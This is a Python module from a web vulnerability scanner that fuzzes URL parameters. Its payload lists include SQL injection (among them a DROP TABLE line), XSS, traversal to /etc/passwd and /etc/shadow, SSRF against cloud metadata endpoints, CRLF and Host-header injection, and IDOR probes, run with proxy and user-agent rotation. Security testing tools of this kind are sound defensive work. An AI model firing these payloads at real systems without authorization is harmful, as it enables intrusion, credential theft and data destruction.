"""
modules/paramfuzz.py
Parameter discovery and vulnerability fuzzing.
DeepFuzzCheck subclasses: SQLi, XSS, PathTraversal, SSRF, OpenRedirect,
HeaderInjection, IDOR.  ParamFuzzer orchestrates all checks.
"""

import re, queue, time, threading
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse, parse_qs

from ..utils import fetch_with_retry, log, log_section, vlog, col, C, random_ua, _CWE_MAP
from ..utils.helpers import validate_file_arg
from collections import defaultdict


# -----------------------------------------------------------------
#  BASE CHECK
# -----------------------------------------------------------------
class DeepFuzzCheck:
    PAYLOADS: List[str] = []
    SEVERITY: str = "LOW"
    LABEL:    str = "GENERIC"

    _SEV_COLOR: Dict[str, str] = {
        "HIGH":   C.RED + C.BOLD,
        "MEDIUM": C.YELLOW + C.BOLD,
        "LOW":    C.CYAN,
    }

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        raise NotImplementedError

    def severity_col(self) -> str:
        return col(f"[{self.SEVERITY}]", self._SEV_COLOR.get(self.SEVERITY, C.WHITE))

    def cwe(self) -> str:
        return _CWE_MAP.get(self.LABEL, "")


# -----------------------------------------------------------------
#  CHECKS
# -----------------------------------------------------------------
class SQLiCheck(DeepFuzzCheck):
    LABEL    = "SQLi"
    SEVERITY = "HIGH"
    PAYLOADS = [
        "' OR '1'='1",
        "1 AND SLEEP(3)-- -",
        "1; DROP TABLE users--",
        "' OR SLEEP(3)--",
        "1 OR 1=1",
        "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    ]
    TIME_THRESHOLD_S: float = 3.0
    ERROR_PATTERNS = re.compile(
        r"sql syntax|syntax error|mysql_fetch|ora-\d{4,5}|pg_query|"
        r"unclosed quotation|sqlite_|microsoft ole db|"
        r"supplied argument is not a valid (mysql|postgresql)|"
        r"division by zero|invalid query|odbc drivers error|"
        r"warning: mysql|psql:|db2 sql error",
        re.I,
    )
    _SLEEP_RE = re.compile(r"sleep\s*\(|pg_sleep|waitfor\s+delay", re.I)

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        body = resp.text if resp else ""
        if elapsed_s >= self.TIME_THRESHOLD_S and self._SLEEP_RE.search(payload):
            return True, f"response time {elapsed_s:.1f}s >= {self.TIME_THRESHOLD_S}s (time-based blind)"
        m = self.ERROR_PATTERNS.search(body)
        if m:
            snippet = body[max(0, m.start()-20):m.end()+40].replace("\n", " ").strip()
            return True, f"DB error keyword: «{snippet[:120]}»"
        return False, ""


class XSSCheck(DeepFuzzCheck):
    LABEL    = "XSS"
    SEVERITY = "HIGH"
    PAYLOADS = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "'><svg onload=alert(1)>",
    ]
    _MARKERS: List[str] = [
        "<script>alert(1)</script>",
        "onerror=alert(1)",
        "javascript:alert(1)",
        "onload=alert(1)",
    ]

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        if not resp:
            return False, ""
        body = resp.text
        for marker in self._MARKERS:
            if marker in payload and marker in body:
                idx = body.find(marker)
                snippet = body[max(0, idx-15):idx+len(marker)+15].replace("\n", " ")
                return True, f"payload reflected unencoded: «{snippet[:120]}»"
        return False, ""


class PathTraversalCheck(DeepFuzzCheck):
    LABEL    = "PathTraversal"
    SEVERITY = "HIGH"
    PAYLOADS = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%252e%252e%252fetc%252fpasswd",
        "../../../etc/shadow",
        "..\\..\\..\\" "windows\\win.ini",
    ]
    _TRIGGERS = re.compile(
        r"root:.*:/bin/(?:bash|sh|nologin)|"
        r"\[boot loader\]|\[extensions\]|daemon:x:\d+",
        re.I,
    )

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        if not resp:
            return False, ""
        m = self._TRIGGERS.search(resp.text)
        if m:
            snippet = resp.text[max(0, m.start()):m.end()+40].replace("\n", " ").strip()
            return True, f"file content leaked: «{snippet[:120]}»"
        return False, ""


class SSRFCheck(DeepFuzzCheck):
    LABEL    = "SSRF"
    SEVERITY = "HIGH"
    PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    _TRIGGERS = re.compile(
        r"ami-[0-9a-f]{8,17}|instance-id|placement/availability-zone|"
        r"iam/security-credentials|computeMetadata|\"compute\":\s*\{|latest/meta-data",
        re.I,
    )

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        if not resp:
            return False, ""
        m = self._TRIGGERS.search(resp.text)
        if m:
            snippet = resp.text[max(0, m.start()):m.end()+60].replace("\n", " ").strip()
            return True, f"cloud metadata in response: «{snippet[:120]}»"
        return False, ""


class OpenRedirectCheck(DeepFuzzCheck):
    LABEL    = "OpenRedirect"
    SEVERITY = "MEDIUM"
    _CANARY  = "https://evil.paramspecter.test"
    PAYLOADS = [
        "https://evil.paramspecter.test",
        "//evil.paramspecter.test",
        "////evil.paramspecter.test",
        "https:////evil.paramspecter.test",
    ]
    _CANARY_HOST = urlparse("https://evil.paramspecter.test").netloc
    _META_RE = re.compile(
        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+url=([^\s"\'>;]+)',
        re.I,
    )

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        if not resp:
            return False, ""
        loc = resp.headers.get("Location", "")
        if loc and self._CANARY_HOST in loc:
            return True, f"Location header redirects to canary: {loc[:120]}"
        m = self._META_RE.search(resp.text)
        if m and self._CANARY_HOST in m.group(1):
            return True, f"meta-refresh redirects to canary: {m.group(1)[:120]}"
        return False, ""


class HeaderInjectionCheck(DeepFuzzCheck):
    LABEL    = "HeaderInjection"
    SEVERITY = "HIGH"
    _CANARY_HOST = "evil.paramspecter.test"
    PAYLOADS = [
        f"host_inject:evil.paramspecter.test",
        "crlf_inject:%0d%0aX-Injected-Header:paramspecter",
        "crlf_inject:\r\nX-Injected-Header:paramspecter",
        "crlf_inject:%250d%250aX-Injected-Header:paramspecter",
    ]
    _CRLF_MARKER = "X-Injected-Header"

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        if not resp:
            return False, ""
        if payload.startswith("host_inject:"):
            body = resp.text
            loc  = resp.headers.get("Location", "")
            if self._CANARY_HOST in body:
                idx = body.find(self._CANARY_HOST)
                snippet = body[max(0, idx-20):idx+len(self._CANARY_HOST)+20].replace("\n", " ")
                return True, f"Host header reflected in body: «{snippet[:120]}»"
            if self._CANARY_HOST in loc:
                return True, f"Host header reflected in Location: {loc[:120]}"
        elif "crlf_inject:" in payload:
            if self._CRLF_MARKER in resp.headers:
                return True, f"CRLF injection: '{self._CRLF_MARKER}' appeared in response headers"
            if self._CRLF_MARKER in resp.text:
                return True, f"CRLF injection marker reflected in response body"
        return False, ""

    def send_custom(self, session, target_url: str, param: str,
                    timeout: int, rotate_ua: bool, proxies) -> Tuple[bool, str]:
        headers = {"Host": self._CANARY_HOST}
        if rotate_ua:
            headers["User-Agent"] = random_ua()
        try:
            resp = session.get(target_url, headers=headers,
                               timeout=timeout, proxies=proxies, allow_redirects=False)
            return self.detect(f"host_inject:{self._CANARY_HOST}", resp, 0)
        except Exception as e:
            return False, str(e)


class IDORCheck(DeepFuzzCheck):
    LABEL    = "IDOR"
    SEVERITY = "HIGH"
    PAYLOADS = ["__idor_probe__"]

    _OWNER_PATTERNS = re.compile(
        r'"(?:user(?:name|_?id)?|email|account|owner|author)"\s*:\s*"([^"]{3,})"',
        re.I,
    )

    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
        return False, ""

    def probe_idor(self, session, target_url: str, param: str,
                   baseline_val: str, baseline_size: int, baseline_code: int,
                   timeout: int, rotate_ua: bool, proxies) -> List[Tuple[bool, str, str]]:
        try:
            base_int = int(baseline_val)
        except (ValueError, TypeError):
            return []

        findings = []
        for probe_val in [base_int + 1, base_int - 1, base_int + 100, 0]:
            if probe_val < 0:
                continue
            sep  = "&" if "?" in target_url else "?"
            url  = f"{target_url}{sep}{param}={probe_val}"
            hdrs = {"User-Agent": random_ua()} if rotate_ua else {}
            try:
                resp = session.get(url, headers=hdrs, timeout=timeout,
                                   proxies=proxies, allow_redirects=True)
                code = resp.status_code
                size = len(resp.content)
                if code != baseline_code and code == 200:
                    findings.append((True, f"Status changed {baseline_code}→{code} for id={probe_val}", str(probe_val)))
                    continue
                if code == 200 and abs(size - baseline_size) > 200:
                    m = self._OWNER_PATTERNS.search(resp.text)
                    evidence = (
                        f"Different record returned for id={probe_val} "
                        f"(size delta={abs(size-baseline_size)}B"
                        + (f", owner field: {m.group(1)[:40]}" if m else "")
                        + ")"
                    )
                    findings.append((True, evidence, str(probe_val)))
            except Exception:
                pass
        return findings


# Registry used by ParamFuzzer
_DEEP_FUZZ_CHECKS: List[DeepFuzzCheck] = [
    SQLiCheck(), XSSCheck(), PathTraversalCheck(),
    SSRFCheck(), OpenRedirectCheck(), HeaderInjectionCheck(), IDORCheck(),
]


# -----------------------------------------------------------------
#  PAYLOAD FILE LOADER
# -----------------------------------------------------------------
def load_payload_file(path: Optional[str]) -> Dict[str, List[str]]:
    if not path:
        return {}
    path = validate_file_arg(path, "Payload file")
    known_labels = {"SQLi", "XSS", "PathTraversal", "SSRF",
                    "OpenRedirect", "HeaderInjection", "IDOR"}
    result: Dict[str, List[str]] = defaultdict(list)
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for lineno, raw in enumerate(f, 1):
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                log("PLOAD", col(f"line {lineno}: missing label prefix, skipped", C.YELLOW), C.YELLOW)
                continue
            label, payload = line.split(":", 1)
            label = label.strip()
            if label not in known_labels:
                log("PLOAD", col(f"line {lineno}: unknown label '{label}', skipped", C.YELLOW), C.YELLOW)
                continue
            result[label].append(payload)
    total = sum(len(v) for v in result.values())
    log("+PL", f"Loaded {col(total, C.BOLD)} custom payloads from {col(path, C.CYAN)}", C.GREEN)
    return dict(result)


# -----------------------------------------------------------------
#  PARAM FUZZER
# -----------------------------------------------------------------
class ParamFuzzer:
    FUZZ_VALUES = [
        "paramspecter1337", "1", "' OR '1'='1",
        "<script>alert(1)</script>", "../../../etc/passwd", "{{7*7}}",
    ]
    _SLEEP_EXTRA_TIMEOUT = 8

    def __init__(self, target_url, param_list, threads, timeout, session,
                 delay, hits_out, stop_event: threading.Event = None,
                 method="GET", rotate_ua=False, proxy_mgr=None,
                 smart_fuzz=False, deep_fuzz=False,
                 custom_payloads: Dict[str, List[str]] = None):
        self.target_url      = target_url
        self.param_list      = param_list
        self.threads         = threads
        self.timeout         = timeout
        self.session         = session
        self.delay           = delay
        self.hits_out        = hits_out
        self.stop_event      = stop_event or threading.Event()
        self.method          = method.upper()
        self.rotate_ua       = rotate_ua
        self.proxy_mgr       = proxy_mgr
        self.smart_fuzz      = smart_fuzz or deep_fuzz
        self.deep_fuzz       = deep_fuzz
        self.custom_payloads = custom_payloads or {}
        self._q              = queue.Queue()
        self._lock           = threading.Lock()
        self._done           = 0
        self._hits:      List[Dict] = []
        self._deep_hits: List[Dict] = []
        self._base_code = 0
        self._base_len  = 0

    def _baseline(self):
        resp, _ = fetch_with_retry(self.session, self.target_url, timeout=self.timeout)
        if resp:
            self._base_code = resp.status_code
            self._base_len  = len(resp.content)
            log("PARAM", f"Baseline -> HTTP {self._base_code}  size={self._base_len}B", C.GRAY)
        else:
            log("PARAM", "Baseline failed", C.RED)

    def run(self):
        self._baseline()
        fuzz_vals = self.FUZZ_VALUES if self.smart_fuzz else [self.FUZZ_VALUES[0]]
        tasks = [(p.strip(), v) for p in self.param_list for v in fuzz_vals]
        total = len(tasks)
        for t in tasks:
            self._q.put(t)

        extra = col("  [+deep-fuzz queued after]", C.MAGENTA) if self.deep_fuzz else ""
        log("PARAM", f"Starting param fuzz -> {col(total, C.BOLD)} tests via {self.method}{extra}", C.CYAN)

        workers = [
            threading.Thread(target=self._worker, args=(total,), daemon=True)
            for _ in range(min(self.threads, total or 1))
        ]
        for w in workers:
            w.start()
        self._q.join()

        if self.deep_fuzz and not self.stop_event.is_set():
            self._run_deep_fuzz()

        if self.stop_event.is_set():
            log("PARAM", col("Parameter fuzz stopped by user", C.YELLOW), C.YELLOW)
        else:
            log("PARAM",
                f"Done -- {col(len(self._hits), C.BOLD+C.GREEN)} basic  "
                f"{col(len(self._deep_hits), C.BOLD+C.RED)} deep findings",
                C.GREEN)
        return self._hits

    def _worker(self, total: int):
        while not self.stop_event.is_set():
            try:
                param, fuzz_val = self._q.get(timeout=1)
            except queue.Empty:
                break
            try:
                proxies = self.proxy_mgr.next() if self.proxy_mgr else None
                if self.method == "GET":
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{param}={quote(fuzz_val)}"
                    resp, _ = fetch_with_retry(
                        self.session, url, timeout=self.timeout,
                        rotate_ua=self.rotate_ua, proxies=proxies,
                        max_retries=1, allow_redirects=False
                    )
                else:
                    resp, _ = fetch_with_retry(
                        self.session, self.target_url, method="POST",
                        data={param: fuzz_val}, timeout=self.timeout,
                        rotate_ua=self.rotate_ua, proxies=proxies,
                        max_retries=1, allow_redirects=False
                    )

                with self._lock:
                    self._done += 1
                    pct = int(self._done / total * 100)

                if resp:
                    code = resp.status_code
                    sz   = len(resp.content)
                    diff = abs(sz - self._base_len)
                    reflected = fuzz_val[:10] in resp.text
                    interesting = (code != self._base_code) or (diff > 100) or reflected

                    if interesting:
                        reasons = []
                        if code != self._base_code:
                            reasons.append(f"status:{code}")
                        if diff > 100:
                            reasons.append(f"delta-size:{diff}B")
                        if reflected:
                            reasons.append("REFLECTED")
                        hit = {
                            "param": param, "payload": fuzz_val,
                            "url": self.target_url, "status": code,
                            "size": sz, "size_diff": diff,
                            "reflected": reflected, "interesting": True
                        }
                        with self._lock:
                            dedup_key = (param, fuzz_val)
                            already = any(
                                (h["param"], h["payload"]) == dedup_key
                                for h in self._hits
                            )
                            if not already:
                                self._hits.append(hit)
                                self.hits_out.append(hit)
                                flag = col("* INTERESTING " + " ".join(reasons), C.GREEN+C.BOLD)
                                log(f"PARAM {pct:>3}%",
                                    f"{col(str(code), C.GREEN)}  "
                                    f"{col('?'+param+'='+fuzz_val[:20], C.YELLOW)}  {flag}", C.CYAN)
            except Exception as e:
                vlog("PARAM", col(f"Worker error: {e}", C.RED), C.RED)
            finally:
                time.sleep(self.delay)
                self._q.task_done()

    def _run_deep_fuzz(self):
        log_section("DEEP FUZZ  (SQLi / XSS / PathTraversal / SSRF / OpenRedirect / HeaderInjection / IDOR)")
        params = [p.strip() for p in self.param_list]
        active_checks = list(_DEEP_FUZZ_CHECKS)

        if self.custom_payloads:
            for check in active_checks:
                extras = self.custom_payloads.get(check.LABEL, [])
                if extras:
                    check.PAYLOADS = list(check.PAYLOADS) + extras
                    log("DEEP", f"Added {col(len(extras), C.BOLD)} custom payload(s) to {col(check.LABEL, C.MAGENTA)}", C.MAGENTA)

        triples: List[Tuple[str, DeepFuzzCheck, str]] = []
        for param in params:
            for check in active_checks:
                if isinstance(check, (IDORCheck, HeaderInjectionCheck)):
                    triples.append((param, check, "__special__"))
                else:
                    for payload in check.PAYLOADS:
                        triples.append((param, check, payload))

        total = len(triples)
        log("DEEP",
            f"{col(len(params), C.BOLD)} params × {col(len(active_checks), C.BOLD)} checks = "
            f"{col(total, C.BOLD+C.MAGENTA)} probes", C.MAGENTA)

        dq: queue.Queue = queue.Queue()
        for triple in triples:
            dq.put(triple)
        done_counter = [0]

        def _deep_worker():
            while not self.stop_event.is_set():
                try:
                    param, check, payload = dq.get(timeout=1)
                except queue.Empty:
                    break
                try:
                    self._probe_deep(param, check, payload, total, done_counter)
                except Exception as e:
                    vlog("DEEP", col(f"Worker error [{check.LABEL}] {param}: {e}", C.RED), C.RED)
                finally:
                    time.sleep(self.delay)
                    dq.task_done()

        workers = [
            threading.Thread(target=_deep_worker, daemon=True)
            for _ in range(min(self.threads, total or 1))
        ]
        for w in workers:
            w.start()
        dq.join()

        if self._deep_hits:
            log_section(f"DEEP FUZZ FINDINGS  ({len(self._deep_hits)} total)")
            for h in self._deep_hits:
                sev_str = col(f"[{h['severity']}]", DeepFuzzCheck._SEV_COLOR.get(h['severity'], C.WHITE))
                cwe_str = col(f"  [{h.get('cwe', '')}]", C.GRAY) if h.get("cwe") else ""
                from ..utils.helpers import ts, _log_lock
                with _log_lock:
                    print(
                        f"  {ts()}  {sev_str}"
                        f"  {col(h['check'], C.MAGENTA)}"
                        f"  param={col(h['param'], C.YELLOW)}"
                        f"  payload={col(repr(h['payload'][:40]), C.WHITE)}{cwe_str}\n"
                        f"  {' '*12}evidence: {col(h['evidence'], C.RED)}"
                    )
        else:
            log("DEEP", col("No deep-fuzz findings.", C.GRAY), C.GRAY)

    def _probe_deep(self, param, check, payload, total, done_counter):
        proxies = self.proxy_mgr.next() if self.proxy_mgr else None
        with self._lock:
            done_counter[0] += 1
            pct = int(done_counter[0] / total * 100)

        if isinstance(check, HeaderInjectionCheck) and payload == "__special__":
            triggered, evidence = check.send_custom(
                self.session, self.target_url, param,
                self.timeout, self.rotate_ua, proxies
            )
            if triggered:
                self._record_deep_hit(check, param, "Host-header-inject", evidence, None, 0, pct)
            for crlf_payload in [p for p in HeaderInjectionCheck.PAYLOADS if "crlf_inject:" in p]:
                sep = "&" if "?" in self.target_url else "?"
                url = f"{self.target_url}{sep}{param}={quote(crlf_payload)}"
                try:
                    resp = self.session.get(url, timeout=self.timeout,
                                            proxies=proxies, allow_redirects=False)
                    t2, e2 = check.detect(crlf_payload, resp, 0)
                    if t2:
                        self._record_deep_hit(check, param, crlf_payload, e2, resp, 0, pct)
                except Exception:
                    pass
            return

        if isinstance(check, IDORCheck) and payload == "__special__":
            qs = parse_qs(urlparse(self.target_url).query, keep_blank_values=True)
            baseline_val = (qs.get(param) or ["1"])[0]
            findings = check.probe_idor(
                self.session, self.target_url, param,
                baseline_val, self._base_len, self._base_code,
                self.timeout, self.rotate_ua, proxies
            )
            for triggered, evidence, tested_val in findings:
                if triggered:
                    self._record_deep_hit(check, param, tested_val, evidence, None, 0, pct)
            return

        _sleep_re = re.compile(r"sleep\s*\(|pg_sleep|waitfor\s+delay", re.I)
        req_timeout = (
            self.timeout + self._SLEEP_EXTRA_TIMEOUT
            if _sleep_re.search(payload) else self.timeout
        )
        follow = not isinstance(check, OpenRedirectCheck)

        t_start = time.monotonic()
        if self.method == "GET":
            sep = "&" if "?" in self.target_url else "?"
            url = f"{self.target_url}{sep}{param}={quote(payload)}"
            resp, _ = fetch_with_retry(
                self.session, url, timeout=req_timeout,
                rotate_ua=self.rotate_ua, proxies=proxies,
                max_retries=1, allow_redirects=follow,
            )
        else:
            resp, _ = fetch_with_retry(
                self.session, self.target_url, method="POST",
                data={param: payload}, timeout=req_timeout,
                rotate_ua=self.rotate_ua, proxies=proxies,
                max_retries=1, allow_redirects=follow,
            )
        elapsed = time.monotonic() - t_start

        triggered, evidence = check.detect(payload, resp, elapsed)
        if triggered:
            self._record_deep_hit(check, param, payload, evidence, resp, elapsed, pct)
        else:
            if done_counter[0] % max(1, total // 40) == 0:
                vlog(f"DEEP {pct:>3}%",
                     f"{col(check.LABEL, C.GRAY)}  {col(param, C.GRAY)}", C.GRAY)

    def _record_deep_hit(self, check, param, payload, evidence, resp, elapsed, pct):
        hit = {
            "check":    check.LABEL,
            "severity": check.SEVERITY,
            "cwe":      check.cwe(),
            "param":    param,
            "payload":  payload,
            "url":      self.target_url,
            "status":   resp.status_code if resp else None,
            "elapsed":  round(elapsed, 2),
            "evidence": evidence,
        }
        with self._lock:
            self._deep_hits.append(hit)
            self.hits_out.append(hit)

        sev_str = col(f"[{check.SEVERITY}]", DeepFuzzCheck._SEV_COLOR.get(check.SEVERITY, C.WHITE))
        cwe_str = col(f"  [{check.cwe()}]", C.GRAY) if check.cwe() else ""
        from ..utils.helpers import ts, _log_lock
        with _log_lock:
            print(
                f"  {ts()}  {col(f'DEEP {pct:>3}%', C.MAGENTA)}  "
                f"{sev_str}  {col(check.LABEL, C.MAGENTA+C.BOLD)}  "
                f"param={col(param, C.YELLOW)}  "
                f"payload={col(repr(str(payload)[:30]), C.WHITE)}{cwe_str}\n"
                f"  {' '*12}evidence: {col(evidence[:100], C.RED)}"
            )
